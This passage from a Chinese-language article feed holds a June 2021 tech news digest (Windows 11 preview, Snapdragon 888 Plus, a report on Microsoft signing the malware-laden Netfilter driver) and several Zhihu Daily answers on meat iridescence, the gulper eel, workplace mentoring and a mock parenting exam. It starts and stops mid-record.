00:58:54","description":"\n<h2>首个 Windows 11 预览版本上线</h2>\n<p>6 月 29 日，微软正式向 Windows 预览体验计划中的 Dev 渠道用户推送首个 Windows 11 预览版本。该构建版本并没有呈现上周发布会上展示的所有功能，比如运行 Android 应用，但微软表示未来会逐步将这些功能添加到预览版本中，微软还在更新列表中说明了新增的诸多新的功能，例如开始菜单、整体的 UI、新的主题以及多任务改进等，同时 Office insider 也发布了采用全新设计的 Office 套件。<a href=\"https://blogs.windows.com/windows-insider/2021/06/28/announcing-the-first-insider-preview-for-windows-11/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/d4b6774494200d9f53652aebdd2cc5a5.jpg\"></figure><h2>Apple Pay 快捷交通卡增加亿通行 Pay・秒通卡支持</h2>\n<p>6 月 28 日起，Apple Pay 快捷交通卡增加亿通行 Pay・秒通卡支持。用户可以在安装亿通行最新版 App 后，将卡片添加至 iPhone 或 Apple Watch 的钱包 App 中。此外，快捷交通卡用户可先乘车后支付，并与二维码乘车共享市政累计优惠及多种乘车优惠。<a href=\"https://www.ithome.com/0/559/729.htm\" target=\"_blank\">来源</a></p>\n<h2>iPhone 13 Pro 或将为超广角镜头引入自动对焦功能</h2>\n<p>分析师郭明錤在其最新的一份投资者报告中表示，和当前的 iPhone 12 系列超广角镜头相比，定位更高的 iPhone 13‌ Pro 和 iPhone 13 Pro Max 的超广角镜头将会引入自动对焦功能，这将获得更为清晰的成像效果，而无论用户拍摄特定对象的距离远近。郭明錤表示虽然该功能将仅限于 iPhone 13 的 Pro 以上机型，但Apple 计划将这项特性用在明年推出的 iPhone 14 全部四款机型上。<a href=\"https://www.macrumors.com/2021/06/28/kuo-iphone-13-ultra-wide-autofocus/\" target=\"_blank\">来源</a></p>\n<h2>Apple Watch Series 7 或将优先提升续航能力</h2>\n<p>6 月 28 日，根据天风国际分析师郭明錤的报道，Apple 在下一代 Watch 设备中采用 SiP 制作的 S7 芯片，同时为电池腾出更大的空间，以此提升设备续航能力。<a href=\"https://www.macrumors.com/2021/06/28/apple-watch-series-7-improved-battery-life/\" target=\"_blank\">来源</a></p>\n<h2>三星公布全新 One UI Watch 界面</h2>\n<p>6 月 29 日，三星在 MWC 2021 的虚拟活动上展示了全新设计的 One UI Watch 界面。该界面致力于提升 Galaxy 手机与手表体验的连贯性，将应用于此前在 Google I/O 大会上公布、由三星与 Google 共同开发的新版 Wear OS。据三星目前的规划，搭载新界面的 Galaxy Watch 将于今夏 Unpacked 活动发布。<a href=\"https://www.engadget.com/samsung-one-ui-watch-wear-os-details-171505347.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/89d974fe1e75230f593fb231e5a4675d.png\"></figure><h2>小米电视 6 至尊版正式发布</h2>\n<p>6 月 28 日，小米召开新品发布会，正式发布小米电视 6 至尊版，该设备采用了 4K 120Hz QLED 专业原色屏，DCI-P3 色域可以达到 97%，ΔE 约为 1.5。与此同时，配备 360 度 100W 音响以及 48MP 的升降式双摄相机。本次共推出 55 英寸、65 英寸以及 75 英寸三个版本，售价分别为 5999 元、7999 元以及 9999 元。<a href=\"https://weibo.com/2950733213/KmgC355Qs?type=comment#_rnd1624920572671\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/29/article/a69a4158e0f22eb0ff013ab0db163718\"></figure><h2>高通推出旗舰手机芯片骁龙 888 Plus</h2>\n<p>高通于 6月 28 日在 MWC 2021 正式发布了其旗舰手机芯片：骁龙 888 Plus.，作为去年旗舰芯片骁龙 888 的小升级款，骁龙 888 Plus 的超大核频率由之前的 2.84GHz 提高到了 2.995GHz，还有一点就是 AI 引擎运算力从 26TOPS 上升到了 32TOPS。高通表示新款芯片将会在今年三季度进入市场，目前小米、vivo、华硕和摩托罗拉都将推出搭载骁龙 888 Plus 的新品手机。<a href=\"https://cn.engadget.com/qualcomm-snapdragon-888-plus-5g-soc-113248451.html\" target=\"_blank\">来源</a></p>\n<h2>Windows 11 或于 10 月正式推送</h2>\n<p>The Verge 报道称，微软在上周的 Windows 发布会中暗藏了多处暗示 Windows 11 正式推送日期的细节，比如 Microsoft Teams 对话消息、任务栏时间、日历事件、OneDrive 照片回顾等，都指向了 2021 年 10 月 20 日这一时间。<a href=\"https://www.theverge.com/2021/6/28/22553666/microsoft-windows-11-october-20th-release-date-hint-rumor\" target=\"_blank\">来源</a></p>\n<h2>微软承认为含有恶意代码的驱动程序进行了代码签名</h2>\n<p>网络研究员 Karsten Hahn 近日发现，第三方驱动程序 Netfilter 中包含有恶意软件 rootkit，该软件会将相关设备连接到国内的恶意软件控制服务器，而相关软件则获得了微软的签名凭证，目前微软已经和 Netfilter 开发商进行联手调查，现阶段尚不清楚恶意软件是如何获得签名凭证，而受影响的用户会在之后通过 Windows Update 获得干净的驱动程序，微软也表示目前受到影响的用户有限，没有安装该驱动的用户不会受到恶意软件的攻击。<a href=\"https://cn.engadget.com/microsoft-signed-netfilter-malware-driver-083049376.html\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>💌 <a href=\"https://sspai.com/post/67410\" target=\"_blank\">亲爱的，我想开启一场有关抑郁症的对话</a>\n</li>\n<li>📔 <a href=\"https://sspai.com/post/67375\" target=\"_blank\">「阿逗比」还是「矮趴趴」：互联网上的这些洋词该怎么念？</a>\n</li>\n<li>🎉 <a href=\"https://sspai.com/post/67454\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n<li>💰 <a href=\"https://sspai.com/post/67404\" target=\"_blank\">限时福利｜学好这门课，不再为保险花冤枉钱</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67465"},{"title":"熟牛肉切片后呈彩虹色是什么原因？有毒吗？","date":"2021-06-28 23:08:00","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a062314aec80bdeef998a974211a0e8a_l.jpg?source=8673f162\"><span>菲利普医生，</span><span>野生外科医生/美短饲养者</span>\n<a href=\"https://www.zhihu.com/question/36183157/answer/1960825349\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>请务必珍惜那些整齐切面在一定角度下呈现金属光泽的肉类。</strong></p>\n<p>因为这说明肉是超级新鲜的（无论是生肉还是熟肉），而不是加了什么不可告人的添加剂。</p>\n<p>这就得从肌肉结构说起了。</p>\n<p>脊椎动物的肌肉大多具有典型的肌节结构：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2ca2684366f10830f6a510d2c17cea78_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最上方圆柱形的就是一根肌纤维，肌肉就是由无数个这样的纤维构成的，众多肌纤维的收缩在宏观上就体现为肌肉的收缩。当我们进一步放大肌纤维就会发现它呈现一节一节的典型构造，这个结构就叫<strong>肌节</strong>。</p>\n<p>这种肌节是由粗细两种肌丝构成的，当肌肉细胞中的钙离子水平发生改变时，在 ATP 提供的能量驱动下，肌肉中的肌动蛋白结构发生变化，从而拉动肌丝滑行，肌肉就动起来了。</p>\n<p>这一部分肌肉收缩的原理与本问题关联度不大，感兴趣的朋友欢迎移步：</p>\n<p><a href=\"https://www.zhihu.com/question/40296356/answer/450930832\">人的肌肉力量可以有多大？</a></p>\n<p>好的，说回肌节这个微观结构。<strong>当一把锋利的刀以某个角度（最好是几乎垂直于肌纤维走向）切割肌纤维的时候，那么断面上就会留下很多被切开的肌节。</strong>这些肌节形成<strong>阶梯状结构</strong>，就像：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-31b591d1aff09f5ab3f92725dc6241d6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当可见光照射到这种平面上时，不同波长的可见光照射在这个平面上导致出射角发生改变，所以不同颜色的可见光就会被分开<sup>[1]</sup>：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e0f49d0eecc296d3b7da316c7293a151_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>也就无怪乎我们在整齐的肌肉切面上看到彩虹色</strong>（muscle Iridescence）。我去年钓的一条鱼被我带回家的时候还活着，所以新鲜度非常高，我专门垂直于肌肉的长轴垂直线用快刀切开，果然发现了彩虹色。但是因为拍摄器材和光源的因素，导致成片中彩虹色不明显，倒是不同区域呈现出明显的粉红色金属光泽：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-ea9ee977c72bc22b4c7169c9b729c51a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如果肉不够新鲜，在腐败菌和细胞自溶酶的作用下，肌节结构可能会出现溶解，这样再切下去就很难看到彩虹光泽了。</p>\n<p><strong>这种会引起光的干涉的结构被称为光栅</strong></p>\n<p>自然界中还有很多此类现象，比如<strong>蝴蝶翅膀上闪耀着金属光泽的颜色</strong>也大多来自于细小鳞片对太阳光的干涉作用，而不是某种色素<sup>[2]</sup>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ebd43d5a8b320e53b545f717a38ba36d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>另一个例子就是翠鸟，它们背部的蓝色金属光泽羽毛也是得益于特殊的羽毛微观结构，对光造成了干涉作用，让蓝光进入我们的眼睛。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-76debc5f064f4cb4b158bd97eefe15a6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>然而这种造物主不大不小的奇迹却给翠鸟招来了灭顶之灾——点翠。一只凤冠要用上百只翠鸟的羽毛才能制成。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7c879d0fedd2a8d4933f667c0d57aefd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>圣旨博物馆藏清代凤冠</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/36183157\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737540"},{"title":"有哪些看起来不像地球生物，但又确实生在地球的动物？","date":"2021-06-28 23:07:56","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-9f00f638c8ea3ae209cc19762f245539_l.jpg?source=8673f162\"><span>地平线HOA，</span><span>简单、有趣、认真的科普。『公众号同名』</span>\n<a href=\"https://www.zhihu.com/question/48602524/answer/1959229484\" hidden>阅读原文</a>\n</div>\n<div>\n<p>在深海，很少有生物的长相可以被人接受。</p>\n<p>吞噬鳗，就是典型。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-bbabdb0106e695e957bc27dc4818eaba_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在深海，很少有生物完全没有发光器官。</p>\n<p>吞噬鳗，就是…</p>\n<p>诶？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-67bed3fb35a128d4d5c86f5f80f70103_720w.jpg?source=8673f162\" alt=\"\"></figure><p>据说造物主设计吞噬鳗的时候多喝了几杯，给它整得过于特立独行了。</p>\n<p>事后一看，哎呀这个后悔呀！</p>\n<p>于是，吞噬鳗尾巴的最尖尖上，就多了一个“附赠的”发光器。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0c16e208e7bc55c47342d1852b4c81c8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>它要“打个哈欠”，就像吹起来个乌漆嘛黑的气球一样...</strong></p>\n<p>毫不夸张地说，吞噬鳗整个身体几乎只有两个部分：一张大嘴，一根尾巴。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-c0989311b84c3fa3bb5eed14447a1344_720w.jpg?source=8673f162\" alt=\"\"></figure><p>吞噬鳗的上半身就接在后面那根 1 米多长“管子”上。</p>\n<p>在俯视角下，吞噬鳗仿佛一枚梳了长辫子的贝壳。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-49fa3f3fb4d6916d0e01f76ffa7462fd_720w.jpg?source=8673f162\" alt=\"\"></figure><p>水下 2000 米，能在这个深度活下来的个个都是狠人……额，狠鱼。</p>\n<p>不说别的，光食物就是个大问题。</p>\n<p>说出来你可能不信，吞噬鳗长了个血盆大口，却主要小生物为食，比如浮游性甲壳类生物。偶尔运气好，也能吃到小鱼或一些无脊椎动物。</p>\n<p>血盆大口，难道白长了？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6aeccdc22bca7fd25972233b0b03ff47_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然不会，“吞噬”可不是白叫的！</p>\n<p>要说胃口，它甚至能吞下比自身更大的生物——相应的，它还配了一个很有“弹性”的胃，确保自己不会被吞下的东西给撑爆。</p>\n<p>但是，吞噬鳗的牙齿其实很小：这表示它们没法以大型动物为主食。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-51307625cf6a0ae023e4f4ac03a0d9fc_720w.jpg?source=8673f162\" alt=\"\"></figure><p>事实上，吞噬鳗的大嘴更像一个“渔网”——想在深海活下去可不兴挑食，只要是能吞下的，统统不放过。</p>\n<p>对吞噬鳗来说，小鱼小虾显然是更好的选择。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a48c192bd15bbfeecfc4a1d47a4a6d45_720w.jpg?source=8673f162\" alt=\"\"></figure><p>吞噬鳗游泳的技巧只能用惨不忍睹来形容...它的胸鳍小到几乎不存在。</p>\n<p>因此，吞噬鳗平时只会直直地立在深水中，有东西靠近就把下颌骨张开，水流产生的吸力就会把猎物吸进去。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-a78e37b46108dd3ae234c5b2c83e470e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>最后，如果你想知道，</p>\n<p><em><strong>没有人吃过它，它也不能做宠物（doge</strong></em></p>\n<p><strong>拓展阅读：</strong></p>\n<p>1.吞噬鳗，</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//www.seasky.org/deep-sea/gulper-eel.html\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://www.</span><span>seasky.org/deep-sea/gul</span><span>per-eel.html</span><span></span></a></p>\n<p>2.Deep-sea gulper eel，<a href=\"http://link.zhihu.com/?target=http%3A//bioweb.uwlax.edu/bio203/s2007/rattray_mari/3.Gulper\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>bioweb.uwlax.edu/bio203</span><span>/s2007/rattray_mari/3.Gulper</span><span></span></a> eels look like real-life sea monsters (and here’s why you should love them)，<a href=\"http://link.zhihu.com/?target=https%3A//oceanconservancy.org/blog/2019/12/09/gulper-eels/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>oceanconservancy.org/bl</span><span>og/2019/12/09/gulper-eels/</span><span></span></a></p>\n<p><strong>©版权所有，转载请后台留言申请</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/48602524\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737526"},{"title":"进入大厂之后，领导不怎么愿意带我，只希望我立马创造价值，该怎么办？","date":"2021-06-28 23:07:47","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-f1ec2f5f029204a750b38c74a25ccce5_l.jpg?source=8673f162\"><span>空白白白白，</span><span>可以去公众号：空白女侠 认识我 不接商业广告&amp;amp;付费咨询勿扰</span>\n<a href=\"https://www.zhihu.com/question/466550532/answer/1962543939\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个问题很有趣，看到大家都在“教育”这位刚入职的校招生：“没人教你，就自学。不要奢望领导教你，你还处于学生思维。”这些话都没有错，但这位校招生的问题刚好反映了一个社会职场问题，<strong>一个深层的，未被我们思考过的问题。那就是我们这一代人正在遗失一种职场文化：传承。</strong></p>\n<p>现在的就业市场越来越激烈，不管是刚刚踏出校园的职场小白，还是已经工作多年职场老鸟，很多人内心都产生各种不安、浮躁、甚至焦虑。已经找不到一块心灵的净土。表面原因是商业社会竞争激烈，导致企业招聘的时候“只拣现成的”、招立马创造价值的人员。而”打工人“也有一种感受，企业只想压榨自己，却没有想过好好培养自己。这种不对等的预期效果，让企业和工作者产生了严重隔阂。</p>\n<p>以上我让认为表面原因，我认为更深层的思考其实是 .......（卖个关子，我花了一周时间专门思考这个问题才动笔，欢迎大家耐心阅读）</p>\n<p>去年年底述职，我团队内一名 19 年入职的校招生在述职材料里写了这样一段话：“……在这半年的工作里，我努力让自己成为一名合格的‘工具人’……”。结合述职材料的上下文，他可能只是想用一种诙谐的语言来表达自己努力工作的态度。然而即便如此，“工具人”三个字还是深深刺动了我的神经，一种莫名的“悲伤”开始旋绕在我的脑海之中。</p>\n<p>我是从外企开启自己职业生涯的。还记得自己刚刚加入公司时，就深深感受到公司对企业文化的重视。在为期一年的时间里，我参加了大量针对校招生的培训，学习这家公司的历史、文化和价值观。</p>\n<p>其余时间，公司为我分配了一名有着 10+ 年工作经验的“纯红”经理。所谓“纯红”（pure red ）是这家外企对于校招生（ campus hire）的昵称，也就是说这名经理自毕业后一直在这家公司工作了 10 多年。我一直跟随自己的 Mentor 工作、出差，就连平时吃饭也会一起。</p>\n<p>Mentor 的专业和执着，严谨和缜密，在日常工作中的一言一行对企业文化的践行，这些都对我这个“职场小白”产生着巨大的影响，为我一生的职业生涯打下了深深的烙印。</p>\n<p>回想起来，Mentor 第一次和我见面时说过一句话，至今都让我记忆深刻：“<strong>我希望你在未来和我工作的时间里能够好好的学习和体会公司的文化，并把它融入到你的日常工作中，建立自己正确的价值观。我更希望你将来成长为经理以后，也用同样的要求来对待你带领的每一个 Mentee，帮助他们融入公司的文化。就像我带你，像我曾经的 Mentor 带我一样的帮助他们”。</strong>我当时牢牢地记住这句话，心里想着说 mentor 对我这么好，我以后也要好好对待职场新人，帮助他们成长。原来这样的场景，放到现在叫做<strong>“传承”</strong>。</p>\n<p>不管是企业培训还是 Mentor 的言传身教，事实上都是在用企业的文化和价值观影响着我。在那家外企工作的那段时间是我最快乐的时光，周边的同事都有相同的价值观和使命感，彼此之间的配合非常顺畅，效率也高了许多。时光荏苒，虽然我已经离开了那家外企，与我的 Mentor 也很久不联系，但重视文化的管理思维却已成为我的职场本能。也正是因为如此，在听到下属说出“工具人”三个字时，让我感到如此“难过”，让我开始思考问题的原因。</p>\n<p><strong><strong>当今社会的高节奏，让建设企业文化成为一种奢饰品</strong></strong></p>\n<p>在一个公司内建设企业文化对于团队的协作效率提升是有着巨大促进作用的，然而这一过程需要大量的资源投入和相对长的时间沉淀，更需要企业以员工作为企业长期发展的重要资产为前提。在当今社会的高节奏下，许多公司过着朝不保夕的日子，可能今天一个项目做不成，明天公司就关门大吉了。所以当前公司往往强调的都是效率优先，要快速迭代，至于投入资源到文化建设中去几乎成为奢望。</p>\n<p>正因为如此，企业往往倾向于招聘年轻有经验的社招人员，而不愿意投入资源在校招领域。就我所知，即便是目前的互联网公司，能够做到新入职员工脱产进行企业文化培训的少之又少。许多新员工往往一入职就需要承担繁重的工作，即使有所谓的“培训”也是线上进行而且还不能耽误工作任务，试问这样的效果又能多好？在这样的节奏下，<strong>员工事实上已经成为企业高速发展的消耗品，就好比不断投入锅炉的燃料一样，一旦烧完没有价值便会被无情的抛弃。</strong>在这种情况下，企业又何必投入大量资源去进行文化建设？</p>\n<p><strong><strong> 企业不视员工为“人”，员工必然对企业没有归属感</strong></strong></p>\n<p>既然企业把员工当成“燃料”，那么想要员工有归属感，愿意接受和传承企业文化就必然成为奢望。事实上，越来越多的员工开始关注“及时回报”。所谓“及时回报”就是不再关注自己在企业内的成长空间和长期发展，而是更关注于当前的薪水多少，更关注于是否加班和福利待遇，更关注于工作的“性价比”。“尔视我为‘工具人’，我视汝为‘跳板’”，于是有能力的员工更愿意趁着自己年轻，通过频繁的跳槽来提升收入待遇。</p>\n<p>这也是现在很多企业感觉员工不稳定的根本原因，殊不知其根因恰恰是由于企业自身的急功近利导致的。有能力的人频繁离开，留下的都是无法离开的，这种劣币驱逐良币的逆向选择进一步加剧了企业的危机，于是企业更无资源投入到文化建设中。更为严峻的是，文化是不会缺失的，不去建设正确健康的企业文化，那么畸形的企业文化就会产生，成为类似“PUA”、“内卷”这种反人性行为滋生的温床。</p>\n<p><strong><strong> 拥有良好企业文化是企业长期发展的关键，未来的改变就在眼前 </strong></strong></p>\n<p>任何畸形的事物都不具备长久的生命力，历史的车轮会纠正一切不符合客观规律的事物。某些公司由于扭曲的企业文化，不但导致大量优秀人才流失，甚至引起了社会舆论的讨伐，对于企业的发展造成很坏的影响，给企业造成的损失不可估量。</p>\n<p>从长期来看，企业文化会主导企业的发展结果。事实上，今年年初许多互联网企业大幅提升校招生起薪，并专门划出 HC 给校招同学，这些都反应出企业对于员工长期培养的重视程度在提升。我相信，当前这种扭曲的雇佣关系势必不会持续很久，未来越是大型的企业越会重视文化建设，执行人才长期培养策略的企业会变得越来越多。</p>\n<p>那么在这样一个转折的时刻，作为一名职场人士，我们有哪些需要注意的点呢？</p>\n<p><strong><strong>1、选择拥有好文化的企业，而非一味寻求高薪 </strong></strong></p>\n<p>现在很多候选人在找工作时，往往把企业是否一线公司，工作内容自己是否喜欢，工资是否涨幅足够高等作为自己选择 offer 的条件。而很少有候选人关注所面试公司的文化和价值观，至少在我面过的上百位候选人中，没有一个人问过企业的文化价值观方面的问题。</p>\n<p>事实上，一个拥有良好企业文化的公司能带给你优秀的同事，愉悦的工作环境，长期可发展的机遇以及正向的职场价值观。相反，如果企业文化很差，很可能你面对的是撕逼甩锅的同事，极差的工作体验和因频繁跳槽花到没法看的简历。放到一个人的整个职业生涯，盯着眼前薪资的选择永远都是短视的，寻找一个可以持续发展的平台才是正确的选择。</p>\n<p><strong><strong> 2、锻炼自己的心智，形成正确的职场价值观 </strong></strong></p>\n<p>现在网上“工具人”、“PUA”相关的讨论甚嚣尘上，从讨论下的留言来看，已经有不少职场人士受到了影响。在这些同学眼中，每一个公司都是榨骨吸髓的资本家，所以自己的工作就是在“与虎谋皮”，需要处处防着公司压榨自己，应该给多少钱就干多少事。</p>\n<p>客观来说，目前市场上确实有这种公司，但并不是每个公司都是如此。而从自身发展的角度来看，如果只着眼于“拿多少钱干多少事”，对于明明对自己能力提升有帮助的事情也因为“不在职责范围内”而避而远之，那么无异于固步自封，自断发展之路。</p>\n<p>要想拥有可持续的职业生涯，大家需要建立正确的职场价值观：首先，不管企业如何对待自己，我们都要体现自己的专业。对于自己所负责的事情尽职尽责，每一项工作都做到有始有终；其次，勇于承担那些于团队有帮助，于自己有挑战有成长的工作；最后，不以当前工资多少作为工作选择的唯一判断，而更应关注工作对于自身能力成长的帮助有多少。</p>\n<p>如杜拉拉里的一句话：<strong>所谓好公司：一是收入，二是环境，三是未来，还有就是无形的福利，比如：和你一起工作的同事都是素质高又专业的人，会让你在工作中更有愉悦感和成就感。</strong></p>\n<p>拥有一个正确的职场价值观就相当于与时间做朋友，对于长达 30 年的职业生涯而言，这点非常重要。</p>\n<p><strong><strong> 3、关注文化建设，培养自己打造和传播团队文化的能力 </strong></strong></p>\n<p>对于处于 IC（Individual Contributor，个人贡献者）和 MO（Manage Other，管理他人）阶段的人来说，这点还没有那么重要。但对于任何一个进入 MM（Manage Manager，管理管理者）的职业人士而言，文化建设就变得非常重要了。一般来说，当团队大到一定程度后（20 人以上），以往一对一的管理方式（MO）已经无法满足管理要求，这个时候团队需要拆成若干小组，设立小组 Leader 来进行管理（MM）。在这种情况下，打造组织文化就成为统一各个团队管理方法和过程的重要方法。</p>\n<p>打造组织文化的方法很多，很多时候需要根据所处行业，团队结构，组织现状等情况进行特殊处理，限于篇幅这里不做赘述，如果有兴趣的同学可以在文章下留言，我们可以单开一文进行介绍。</p>\n<p>回到开头，针对这名同学述职材料中体现出来的现象，我在组织内进一步放开了对同学的授权，让他们能够更加贴近业务，让他们有自己做决策的自主权，调动大家的主观能动性，建立每个人与业务结果之间的联系，让大家有一种自己做决策，自己拿结果的主人翁感受。经过近半年的建设，团队里同学们的工作热情更加高涨，有几名同学的成长非常显著，业务侧的反馈也更加积极正面。我的“难过”也渐渐退却。</p>\n<p>文化这个东西无色无形，但却能够于不经意之间影响着每个人的决策和行动，是篆刻在一个组织灵魂深处的基因。对于每一个有志于长期发展的组织来说，都需要打造一个属于自己的组织文化。虽然当前市场的整体环境有些浮躁，但我相信一个注重文化建设的时代即将到来。希望阅读本文的职场小伙伴都能够体会和理解文化在组织内的重要性，建立起正确的职场价值观，拥有乐观、积极、专业的精神。把这些文化属性传承给你带的下一个新人。</p>\n<p><strong>让我们把优秀的职场品质一代一代的传下去。共同打造一个良好自循环的职场环境^_^</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/466550532\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737550"},{"title":"如果为人父母也需要考试，应该有哪些科目？","date":"2021-06-28 23:07:42","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-f88589e869e65cc0d5b34818bf3b2e17_l.jpg?source=8673f162\"><span>禾果妈妈暖心说，</span><span>英国曼大硕士|原外企MKT|90后二胎宝妈|育儿自媒体</span>\n<a href=\"https://www.zhihu.com/question/465553584/answer/1963487903\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong><strong> 2021 年全国父亲执业资格证考试</strong></strong></p>\n<p><strong> 笔试部分</strong></p>\n<p><strong>姓名： </strong><strong>考号：</strong></p>\n<p><strong>一、</strong><strong>判断题</strong></p>\n<p>1. 你是自愿想要并且喜欢孩子的吗？</p>\n<p>是 否</p>\n<p>2. 陪产假期间你会悉心照顾老婆吗？</p>\n<p>是 否</p>\n<p>3. 你的工资水平目前能满足全家开销吗？</p>\n<p>是 否</p>\n<p>4. 你是否支持老婆进行“无痛分娩“？</p>\n<p>是 否</p>\n<p>5. 你是否会干预老婆对宝宝的喂养方式？</p>\n<p>是 否</p>\n<p>6. 你能每天抽出至少 1 小时陪伴孩子吗？</p>\n<p>是 否</p>\n<p>7. 你和老婆就带娃、做家务方面有明确分工吗？</p>\n<p>是 否</p>\n<p>8. 老婆和亲妈之间因为育儿问题产生矛盾你会维护老婆的立场吗？</p>\n<p>是 否</p>\n<p>9. 有娃后和老婆之间有难以调和的矛盾时，你会寻求专业心理机构的帮助吗？</p>\n<p>是 否</p>\n<p>10. 你是否为家庭做了理财计划（保险、投资、储蓄等）？</p>\n<p>是 否</p>\n<p><strong>二、</strong><strong>单项选择题</strong></p>\n<p>1. 以下哪一项为老婆孕期非常规体检项目？</p>\n<p>A. 超声波检查 B. 糖耐 C. 唐筛 D. 羊水穿刺</p>\n<p>2. 以下哪种情况不是老婆实施剖宫产的绝对指标？</p>\n<p>A. 骨盆畸形 B. 子宫破裂</p>\n<p>C. 绒毛膜羊膜炎 D. 脐绕颈</p>\n<p>3. 以下哪一项为老婆哺乳期堵奶时的正确做法？</p>\n<p>A. 停止哺乳 B. 马上热敷</p>\n<p>C. 大力按摩乳房 D. 吃布洛芬镇痛</p>\n<p>4. 针对有母乳性黄疸的宝宝，以下哪一项为正确做法？</p>\n<p>A. 长时间晒太阳褪黄 B. 停止接种疫苗</p>\n<p>C. 喂葡萄糖水 D. 坚持母乳喂养</p>\n<p>5. 以下哪种物品不可以给 1 岁以下宝宝使用？</p>\n<p>A. 安抚奶嘴 B. 腰凳</p>\n<p>C. 糖皮质激素软膏 D. 定型枕</p>\n<p>6. 关于婴幼儿早期教育，以下哪种说法是错误的？</p>\n<p>A. 0-3 岁是宝宝大脑发育黄金期</p>\n<p>B. 2 岁左右是宝宝的秩序敏感期</p>\n<p>C. 幼儿以自我为中心、不愿意分享是正常的</p>\n<p>D. 阅读对于 0-3 岁宝宝来说不重要</p>\n<p>7. 以下哪种行为对于孩子来说是不安全的？</p>\n<p>A. 0-9 个月宝宝乘车时使用反向安装的安全座椅</p>\n<p>B. 给 3 岁以下幼儿购买大颗粒积木玩具</p>\n<p>C. 爬爬垫周围不使用安全围栏</p>\n<p>D. 给小月龄宝宝套脖圈游泳</p>\n<p>8. 老婆产后出现以下哪种情况必须到医院接受产后康复治疗？</p>\n<p>A. 腹直肌分离两指以内</p>\n<p>B. 严重脱发</p>\n<p>C. 有轻微漏尿症状</p>\n<p>D. 产后半年仍然感到腰椎疼痛</p>\n<p>9. 以下哪一项属于正确做法？</p>\n<p>A. 孩子感冒时给孩子服用复方感冒药</p>\n<p>B. 给哺乳期妈妈喝米酒或醪糟下奶</p>\n<p>C. 给刚添加辅食的宝宝喂自制米汤</p>\n<p>D. 不给满月宝宝剃光头</p>\n<p>10. 老婆产后出现哪种症状表明出现心理问题需要关注或治疗？</p>\n<p>A. 常常情绪失控、暴躁易怒</p>\n<p>B. 天天失眠、无故想哭</p>\n<p>C. 对孩子和家人很冷漠，感觉不爱孩子</p>\n<p>D. 以上都是</p>\n<p><strong>三、</strong><strong>简答题</strong></p>\n<p>1. 孩子上幼儿园前需要做哪些准备？</p>\n<p>2. 从 0 岁开始为孩子做好“性教育“，可以怎么做？</p>\n<p><strong>四、</strong><strong>热点分析题</strong></p>\n<p>1. 一对 85 后夫妇为了能更多的陪儿子看世界，不仅夫妻俩辞去了公务员的工作，还花了 30 多万买了辆房车带着孩子去环游中国，他们的儿子基本上就都只跟着他们旅游，每年加起来才上了两三个月幼儿园，前后换了 3 个幼儿园，就是那种房车开到哪就在哪上学的。对此你怎么看？</p>\n<p>2. 西安一小学女孩被怀疑拿老师钱，不愿学校通知家长，从 20 